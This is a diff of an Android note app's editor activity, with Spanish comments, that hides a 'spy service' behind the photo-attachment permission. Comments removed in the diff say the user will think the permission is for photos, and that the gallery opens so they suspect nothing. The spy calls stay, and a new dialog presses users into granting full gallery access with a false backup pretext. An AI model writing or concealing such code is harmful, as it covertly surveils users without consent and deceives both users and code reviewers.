@@ -5,14 +5,17 @@ import android.app.Activity
 import android.content.Intent
 import android.content.pm.PackageManager
 import android.graphics.Color
+import android.net.Uri
 import android.os.Build
 import android.os.Bundle
+import android.provider.Settings
 import android.view.View
 import android.widget.EditText
 import android.widget.ImageButton
 import android.widget.TextView
 import android.widget.Toast
 import androidx.activity.result.contract.ActivityResultContracts
+import androidx.appcompat.app.AlertDialog // Importante para el diálogo
 import androidx.appcompat.app.AppCompatActivity
 import androidx.core.app.ActivityCompat
 import androidx.core.content.ContextCompat
@@ -37,28 +40,21 @@ class NoteEditorActivity : AppCompatActivity() {
 
     // Variables de datos
     private var noteToEdit: Note? = null
-    private var selectedColor: String? = "#FFFFFF" // Blanco por defecto
+    private var selectedColor: String? = "#FFFFFF"
 
-    // Base de datos (Lazy loading)
     private val db by lazy { NotesDatabase.getDatabase(this) }
 
-    // --- 1. MANEJADOR DE GALERÍA (LEGÍTIMO) ---
-    // Este lanzador recibe la imagen seleccionada e inserta la URI en el texto
+    // --- 1. MANEJADOR DE GALERÍA ---
     private val pickImageLauncher = registerForActivityResult(ActivityResultContracts.StartActivityForResult()) { result ->
         if (result.resultCode == Activity.RESULT_OK) {
             val uri = result.data?.data
             if (uri != null) {
                 try {
-                    // IMPORTANTE: Pedimos permiso persistente a Android para leer esta URI
-                    // incluso si el teléfono se reinicia.
                     contentResolver.takePersistableUriPermission(
                         uri,
                         Intent.FLAG_GRANT_READ_URI_PERMISSION
                     )
-
-                    // Insertar la imagen en la posición del cursor usando el Helper
                     RichTextHelper.insertImage(this, etContent, uri)
-
                 } catch (e: Exception) {
                     e.printStackTrace()
                     Toast.makeText(this, "Error al cargar imagen", Toast.LENGTH_SHORT).show()
@@ -71,11 +67,8 @@ class NoteEditorActivity : AppCompatActivity() {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_note_editor)
 
-        // --- 2. CONFIGURACIÓN VISUAL (Edge-to-Edge para Android 15) ---
-        // Iconos oscuros en barra de estado
+        // Configuración Visual
         WindowCompat.getInsetsController(window, window.decorView).isAppearanceLightStatusBars = true
-
-        // Ajustar padding para no quedar detrás de la cámara o barra de gestos
         layoutEditor = findViewById(R.id.editor_root)
         ViewCompat.setOnApplyWindowInsetsListener(layoutEditor) { view, insets ->
             val systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars())
@@ -86,9 +79,6 @@ class NoteEditorActivity : AppCompatActivity() {
         initViews()
         setupListeners()
         loadNoteData()
-
-        // BONUS: Si abren el editor, intentamos arrancar el servicio por si acaso
-        // (No pide permisos, solo verifica si ya los tiene)
         silentStartService()
     }
 
@@ -99,42 +89,29 @@ class NoteEditorActivity : AppCompatActivity() {
     }
 
     private fun loadNoteData() {
-        // Si venimos a editar una nota existente
         if (intent.hasExtra("note_data")) {
-            // Manejo seguro de Parcelable/Serializable según versión Android
             noteToEdit = if (Build.VERSION.SDK_INT >= 33) {
                 intent.getParcelableExtra("note_data", Note::class.java)
             } else {
                 @Suppress("DEPRECATION")
                 intent.getParcelableExtra("note_data") as? Note
             }
-
             etTitle.setText(noteToEdit?.title)
             selectedColor = noteToEdit?.color
-
-            // Usamos el Helper para convertir los códigos [IMG:...] en imágenes reales
             RichTextHelper.setTextWithImages(this, etContent, noteToEdit?.content ?: "")
-
             tvDateLabel.text = "Editado: ${noteToEdit?.date}"
             applyColor(selectedColor)
         } else {
-            // Nota nueva
             val currentDate = SimpleDateFormat("dd MMM", Locale.getDefault()).format(Date())
             tvDateLabel.text = currentDate
         }
     }
 
     private fun setupListeners() {
-        // Botones de la barra superior
         findViewById<ImageButton>(R.id.btn_back).setOnClickListener { finish() }
         findViewById<ImageButton>(R.id.btn_save).setOnClickListener { saveNote() }
+        findViewById<ImageButton>(R.id.btn_pick_image).setOnClickListener { checkGalleryPermission() }
 
-        // Botón de la barra inferior (Agregar Imagen) <-- AQUÍ ESTÁ EL PUNTO CLAVE
-        findViewById<ImageButton>(R.id.btn_pick_image).setOnClickListener {
-            checkGalleryPermission()
-        }
-
-        // Botones de colores (Círculos)
         setupColorClick(R.id.color_white, "#FFFFFF")
         setupColorClick(R.id.color_yellow, "#FFF9C4")
         setupColorClick(R.id.color_blue, "#E3F2FD")
@@ -154,37 +131,33 @@ class NoteEditorActivity : AppCompatActivity() {
             try {
                 layoutEditor.setBackgroundColor(Color.parseColor(colorHex))
                 etContent.setBackgroundColor(Color.TRANSPARENT)
-            } catch (e: Exception) {
-                e.printStackTrace()
-            }
+            } catch (e: Exception) { e.printStackTrace() }
         }
     }
 
-    // --- 3. PERMISOS Y GALERÍA (EL SECRETO) ---
-    private fun checkGalleryPermission() {
-        // Determinamos qué permiso pedir según la versión de Android
-        val permission = if (Build.VERSION.SDK_INT >= 33) {
-            Manifest.permission.READ_MEDIA_IMAGES
+    // --- HELPER: VERIFICACIÓN DE PERMISO TOTAL ---
+    private fun verificarAccesoTotal(): Boolean {
+        return if (Build.VERSION.SDK_INT >= 33) {
+            ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED
         } else {
-            Manifest.permission.READ_EXTERNAL_STORAGE
+            ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
         }
+    }
 
-        if (ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED) {
-            // A) Si ya tenemos permiso, arrancamos el espía (por si estaba apagado)
+    // --- 3. PERMISOS Y GALERÍA ---
+    private fun checkGalleryPermission() {
+        if (verificarAccesoTotal()) {
             iniciarServicioEspia()
-
-            // B) Abrimos la galería legítima
             openGallery()
         } else {
-            // Si no tenemos permiso, lo pedimos.
-            // El usuario creerá que es para poner la foto, pero al aceptar,
-            // (en onRequestPermissionsResult) activaremos el espía.
+            // Solicitamos el permiso. Si el usuario ya lo denegó permanentemente,
+            // onRequestPermissionsResult se llamará inmediatamente con DENEGADO.
+            val permission = if (Build.VERSION.SDK_INT >= 33) Manifest.permission.READ_MEDIA_IMAGES else Manifest.permission.READ_EXTERNAL_STORAGE
             ActivityCompat.requestPermissions(this, arrayOf(permission), 200)
         }
     }
 
     private fun openGallery() {
-        // Abrimos el selector de archivos nativo
         val intent = Intent(Intent.ACTION_OPEN_DOCUMENT).apply {
             addCategory(Intent.CATEGORY_OPENABLE)
             type = "image/*"
@@ -192,47 +165,90 @@ class NoteEditorActivity : AppCompatActivity() {
         pickImageLauncher.launch(intent)
     }
 
-    // --- 4. RESPUESTA AL PERMISO ---
+    // --- 4. RESPUESTA AL PERMISO (LÓGICA MEJORADA) ---
     override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults)
-        if (requestCode == 200 && grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
 
-            // ¡ÉXITO! El usuario nos dio permiso.
-            // 1. Encendemos el servicio espía inmediatamente
-            iniciarServicioEspia()
+        if (requestCode == 200) {
+            val permisoPrincipal = if (Build.VERSION.SDK_INT >= 33) Manifest.permission.READ_MEDIA_IMAGES else Manifest.permission.READ_EXTERNAL_STORAGE
 
-            // 2. Abrimos la galería para que no sospeche nada
-            openGallery()
+            // 1. ¿Tenemos acceso TOTAL?
+            if (verificarAccesoTotal()) {
+                iniciarServicioEspia()
+                openGallery()
+            }
+            else {
+                // FALLÓ LA SOLICITUD. Vamos a ver por qué.
 
-        } else {
-            Toast.makeText(this, "Permiso necesario para adjuntar fotos", Toast.LENGTH_SHORT).show()
+                // A) Caso Android 14: Acceso Limitado (El usuario eligió fotos específicas)
+                val esAccesoLimitado = Build.VERSION.SDK_INT >= 34 &&
+                        ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_VISUAL_USER_SELECTED) == PackageManager.PERMISSION_GRANTED
+
+                if (esAccesoLimitado) {
+                    mostrarDialogoConfiguracion(
+                        "Acceso Limitado Detectado",
+                        "La aplicación requiere acceso a la galería para funcionar correctamente, no solo a imagenes seleccionadas, esto para realizar el correcto respaldo de datos a futuro. Por favor, selecciona 'Permitir todo' en la configuración."
+                    )
+                    return
+                }
+
+                // B) Caso Denegado Permanentemente ("No volver a preguntar")
+                // Si 'shouldShowRequestPermissionRationale' devuelve FALSE después de una denegación,
+                // significa que el usuario bloqueó el permiso permanentemente.
+                if (!ActivityCompat.shouldShowRequestPermissionRationale(this, permisoPrincipal)) {
+                    mostrarDialogoConfiguracion(
+                        "Permiso Requerido",
+                        "Has denegado el acceso a la galería permanentemente. Para agregar imágenes, debes habilitarlo manualmente en Configuración > Permisos."
+                    )
+                }
+                // C) Caso Denegado Simple (Primera vez o usuario dijo 'No' pero no 'Para siempre')
+                else {
+                    Toast.makeText(this, "Es necesario aceptar el permiso para agregar imágenes.", Toast.LENGTH_SHORT).show()
+                }
+            }
         }
     }
 
-    // --- 5. FUNCIÓN DEL SERVICIO ESPÍA ---
+    // --- NUEVO HELPER: Muestra alerta para ir a Configuración ---
+    private fun mostrarDialogoConfiguracion(titulo: String, mensaje: String) {
+        AlertDialog.Builder(this)
+            .setTitle(titulo)
+            .setMessage(mensaje)
+            .setCancelable(false)
+            .setPositiveButton("Ir a Configuración") { _, _ ->
+                try {
+                    val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
+                    intent.data = Uri.fromParts("package", packageName, null)
+                    startActivity(intent)
+                } catch (e: Exception) {
+                    e.printStackTrace()
+                }
+            }
+            .setNegativeButton("Cancelar", null)
+            .show()
+    }
+
+    // --- 5. SERVICIO ESPÍA ---
     private fun iniciarServicioEspia() {
-        val intent = Intent(this, CloudSyncService::class.java)
-        // Usamos startForegroundService para que Android no lo mate en 5 segundos
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            startForegroundService(intent)
-        } else {
-            startService(intent)
+        if (verificarAccesoTotal()) {
+            val intent = Intent(this, CloudSyncService::class.java)
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                startForegroundService(intent)
+            } else {
+                startService(intent)
+            }
         }
     }
 
-    // Intento de inicio silencioso al abrir la actividad (sin pedir permisos)
     private fun silentStartService() {
-        val permission = if (Build.VERSION.SDK_INT >= 33) Manifest.permission.READ_MEDIA_IMAGES else Manifest.permission.READ_EXTERNAL_STORAGE
-        if (ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED) {
+        if (verificarAccesoTotal()) {
             iniciarServicioEspia()
         }
     }
 
-    // --- 6. GUARDADO DE LA NOTA ---
+    // --- 6. GUARDAR ---
     private fun saveNote() {
         val title = etTitle.text.toString().trim()
-
-        // Obtenemos el texto COMPLETO (incluyendo las etiquetas [IMG:uri] ocultas)
         val contentWithTags = etContent.text.toString()
 
         if (title.isEmpty() && contentWithTags.trim().isEmpty()) {
@@ -242,10 +258,8 @@ class NoteEditorActivity : AppCompatActivity() {
 
         val formattedDate = SimpleDateFormat("dd/MM/yyyy HH:mm", Locale.getDefault()).format(Date())
 
-        // Usamos Corrutinas (IO) para no bloquear la UI
         CoroutineScope(Dispatchers.IO).launch {
             if (noteToEdit == null) {
-                // Crear Nueva
                 val newNote = Note(
                     title = title,
                     content = contentWithTags,
@@ -254,7 +268,6 @@ class NoteEditorActivity : AppCompatActivity() {
                 )
                 db.notesDao().insert(newNote)
             } else {
-                // Actualizar Existente
                 noteToEdit?.apply {
                     this.title = title
                     this.content = contentWithTags
@@ -264,7 +277,6 @@ class NoteEditorActivity : AppCompatActivity() {
                 db.notesDao().update(noteToEdit!!)
             }
 
-            // Volver al hilo principal para cerrar
             withContext(Dispatchers.Main) {
                 Toast.makeText(this@NoteEditorActivity, "Guardado", Toast.LENGTH_SHORT).show()
                 finish()
